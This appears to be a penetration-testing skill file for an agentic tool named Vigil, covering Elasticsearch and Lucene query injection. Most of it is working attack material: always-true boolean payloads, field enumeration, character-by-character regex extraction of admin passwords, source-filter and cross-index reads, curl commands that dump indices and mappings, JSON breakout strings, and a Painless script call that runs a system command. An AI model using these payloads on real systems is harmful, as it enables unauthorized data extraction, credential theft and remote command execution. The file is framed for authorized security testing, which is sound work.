---
name: elasticsearch-injection
description: Elasticsearch and Lucene query injection — query_string abuse, field enumeration, cross-index access, and data extraction via search syntax
origin: Vigil
vuln_class: elasticsearch-injection
---

# Elasticsearch / Lucene Injection Testing

> **`vigil assess kali` audit flags:** use `--technique NOSQLI` for injection probes (ES is a document store). Use `--probe-kind payload` for injection attempts, `--probe-kind exploit` for confirmed extraction demonstrations.

## When to Activate

- Application has search functionality backed by Elasticsearch, OpenSearch, or Apache Solr
- Tech fingerprint shows ES indicators: `X-Elastic-Product` header, `/_cluster/health` accessible, response contains `hits`, `_source`, `_score`, `took` fields
- Search parameters accept complex query syntax (AND/OR, wildcards, field:value notation)
- Error messages reference Lucene, Elasticsearch, or query parsing failures
- Application uses a search-as-a-service pattern where user input flows to ES query construction

## Reality Check

Elasticsearch injection in 2025 primarily targets `query_string` and `simple_query_string` query types where user input is concatenated or interpolated into the Lucene query syntax. Script injection (`painless`, `groovy`) is disabled by default since ES 5.x and rarely viable in production. The primary attack surface is:

1. **Data extraction via search syntax** — reading fields the application never intended to expose
2. **Cross-index access** — querying indices the application's search feature should not reach
3. **Query manipulation** — altering search logic to bypass access controls implemented at the query layer
4. **DoS via expensive queries** — regex, wildcard, or script-score abuse

## Tools

- `vigil assess kali exec -- curl ...` for all probing (mandatory audit pipeline)
- `vigil assess anomaly-score <responses.jsonl>` (triage a blind `$regex`-range / `_exists_` sweep — rank the search-response population to find the range that flipped the result count; see Phase 4)
- Browser DevTools for observing search request/response shapes
- `jq` for parsing JSONL search responses

---

## Phase 1: Identify Elasticsearch Backend

### Detection Signals

- [ ] Response JSON contains `hits.hits[]._source`, `hits.total`, `took`, `_shards`
- [ ] `/_cluster/health` or `/_cat/indices` returns data (direct ES access — rare but devastating)
- [ ] Error messages contain: `QueryParsingException`, `SearchPhaseExecutionException`, `query_shard_exception`, `illegal_argument_exception` with Lucene references
- [ ] Search accepts `*` and returns more results than a specific term
- [ ] Search accepts `field:value` notation (Lucene query_string syntax)
- [ ] `X-Elastic-Product: Elasticsearch` header in responses
- [ ] Response timing correlates with query complexity (wildcard slower than exact match)

### Confirm Query Type

Send these probes to determine which query type is in use:

```
# query_string detection (Lucene full syntax)
search=test AND 1=1          → same results as "test" → query_string confirmed
search=test AND 1=2          → zero results → boolean logic processed

# simple_query_string detection (limited syntax, never errors)
search=+test -impossible     → results for "test" without "impossible"
search="exact phrase"        → fewer results than individual words

# match query (no injection surface — safe)
search=test AND 1=1          → results include "AND" and "1=1" as literal terms
```

If `AND`/`OR` are processed as boolean operators rather than literal text, injection is viable.

---

## Phase 2: Query Syntax Injection

### 2.1 Boolean Logic Manipulation

```
# Bypass search filters by injecting always-true conditions
search=anything OR *:*
search=test") OR ("1"="1

# Negate application-injected restrictions
search=* NOT status:deleted
search=* NOT tenant_id:CURRENT_TENANT

# Access control bypass: if the app adds `AND visible:true`
search=sensitive data") OR ("1"="1
```

### 2.2 Field Enumeration

The highest-value attack: discovering and reading fields the search UI never exposes. Full payload library in `agent/references/payloads/elasticsearch-injection-payloads.md` § "Field Enumeration Payloads."

**Quick probe (confirm field-qualified queries work):**
```
search=password:*
search=_exists_:api_key
search=pass*:*
```

**Interpretation**: If `search=password:*` returns different results than `search=xyznonexistent:*`, the `password` field exists and is searchable. Once confirmed, iterate the full sensitive field list from the reference.

### 2.3 Data Extraction via Field Queries

Once a sensitive field is confirmed to exist, extract values using regex binary search (full extraction methodology in the reference § "Data Extraction Payloads"):

```
search=password:/^[a-m].*/     → narrow first character range
search=password:/^[a-g].*/     → binary search continues
search=salary:[50000 TO 100000] → range queries for numeric fields
```

### 2.4 Cross-Index Access

If the application doesn't restrict which indices the query hits:

```
search=*&index=_all
search=*&index=credentials
```

### 2.5 Source Filtering Injection

Override `_source` filtering to read hidden fields:

```
?search=test&_source=password,api_key,secret
?search=test&_source_includes=*
```

---

## Phase 3: Direct API Access (if ES is exposed)

If `/_cluster/health` or any `/_` endpoint responds, you have direct ES API access:

### 3.1 Enumeration

```bash
# List all indices
curl https://target:9200/_cat/indices?v

# Get index mappings (field names and types)
curl https://target:9200/users/_mapping
curl https://target:9200/*/_mapping

# Search all documents in an index
curl https://target:9200/users/_search?size=100

# Get specific fields
curl -X POST https://target:9200/users/_search \
  -H "Content-Type: application/json" \
  -d '{"_source": ["email", "password_hash", "api_key"], "query": {"match_all": {}}}'
```

### 3.2 Dangerous Operations (only with explicit authorization)

```bash
# Snapshot API (full data export)
curl https://target:9200/_snapshot/_all

# Reindex (copy data between indices)
# Script execution (if enabled)
curl -X POST https://target:9200/_scripts/painless/_execute \
  -H "Content-Type: application/json" \
  -d '{"script": {"source": "Runtime.getRuntime().exec(\"id\")"}}'
```

---

## Phase 4: Blind Extraction

When the application returns search results but hides raw field values:

### Boolean-Based Blind via Result Count

```
# Baseline: count results for a known term
search=company_name:Acme    → 150 results

# Extract admin password character by character
search=company_name:Acme AND admin_password:/^a.*/  → 150 results (starts with 'a')
search=company_name:Acme AND admin_password:/^b.*/  → 0 results
# ... narrow down character by character

# Binary search on character ranges
search=admin_password:/^[a-m].*/  → results → first char is a-m
search=admin_password:/^[a-g].*/  → no results → first char is h-m
search=admin_password:/^[h-j].*/  → results → first char is h-j
```

**Triaging the range sweep mechanically.** When you fan out a batch of range probes and the "results vs no results" signal is buried in `hits.total` deltas across near-identical JSON bodies, capture each response (include the hit count as `words` or `content_length`, plus `status`) and let the anomaly oracle pick the range that flipped:

```bash
# one JSONL line per range probe: {"url":"...:/^[a-m].*/","status":200,"content_length":18840,"words":150,"lines":1}
vigil assess anomaly-score es_ranges.jsonl --top 5
```

The range that matched (returned the full result set) lands in a different `length_bucket`/`words_bucket` than the empty-result probes, so the oracle ranks it first — that is your "true" branch; recurse into it. (The oracle scores only the response-shape attributes it understands — `status`, `length_bucket`, `content_type`, header/title/words/lines buckets — so a volatile `took`/`_scroll_id` in the raw JSON is simply ignored; record the stable `hits.total` as `content_length` or `words` to give it a signal.) A flat ranking means no range flipped the count: the field does not exist or is not searchable on this signal. Same pass works for triaging an `_exists_:<field>` field-enumeration sweep — feed all candidate-field responses in and investigate the outlier (the field that exists) first.

### Timing-Based Blind via Regex Complexity

```
# Expensive regex causes measurable delay when field matches
search=password:/.*a{1000}.*/ → slow if field exists and is searched
search=password:/[a-z]{50}/   → expensive backtracking

# Compare timing:
# Fast: search=nonexistent_field:/pattern/ (field doesn't exist, no work)
# Slow: search=real_field:/expensive_pattern/ (field exists, regex evaluated)
```

---

## Phase 5: Query Injection in Structured Bodies

When the application sends search requests as JSON POST bodies and user input is interpolated:

### Template Injection in Query Construction

```json
// Application builds: {"query": {"query_string": {"query": "USER_INPUT"}}}
// Inject to break out:
USER_INPUT = *", "fields": ["password"], "_source": ["password", "email"]},"dummy": {"match_all": {"query": "

// Application builds: {"query": {"bool": {"must": [{"match": {"title": "USER_INPUT"}}]}}}  
// Inject to add conditions:
USER_INPUT = test"}},{"match_all":{}}],"should":[{"match":{"password":"
```

### Aggregation Injection

If user input reaches aggregation queries:

```json
// Inject aggregation to extract field statistics
{"aggs": {"leaked_data": {"terms": {"field": "password.keyword", "size": 1000}}}}
```

---

## What to Record

- Search endpoint and parameter where injection was confirmed
- Query type in use (`query_string`, `simple_query_string`, direct API)
- Fields discovered that are not exposed through the normal UI
- Data extracted (show the pattern worked)
- Cross-index access proof (if applicable)
- Attacker outcome: what sensitive data is accessible, what access controls are bypassed
- Severity:
  - **Critical**: Direct ES API access without auth, or extraction of credentials/secrets via search injection
  - **High**: Cross-index access to sensitive data, or field enumeration revealing PII/financial data
  - **Medium**: Query manipulation bypassing search-level access controls, or DoS via expensive queries
  - **Low**: Field existence confirmation without data extraction

## Kill Signals — Stop Testing When

- Application uses `match` or `term` queries only (no query_string) → no injection surface
- All Lucene metacharacters are escaped or stripped before reaching ES → properly sanitized
- `AND`, `OR`, `*`, `field:value` are all treated as literal text → safe query type
- Direct ES endpoints (`/_cluster`, `/_cat`) all return 404 or require auth → no direct access

## Escalate When

- `search=*` returns significantly more results than a specific term → wildcard processed, query_string confirmed
- `search=_exists_:password` returns results → sensitive field exists in the index, attempt extraction
- `search=field:value` syntax changes results compared to just `value` → field-qualified queries work, enumerate fields
- Error messages expose index names, field types, or mapping details → use this intel to craft targeted extractions
- `/_cat/indices` or `/_mapping` respond without auth → direct ES API access, enumerate everything

## Extended Resources

- `agent/references/payloads/elasticsearch-injection-payloads.md` — Full payload library
- `agent/references/payloads/nosql-injection-payloads.md` — Related NoSQL context
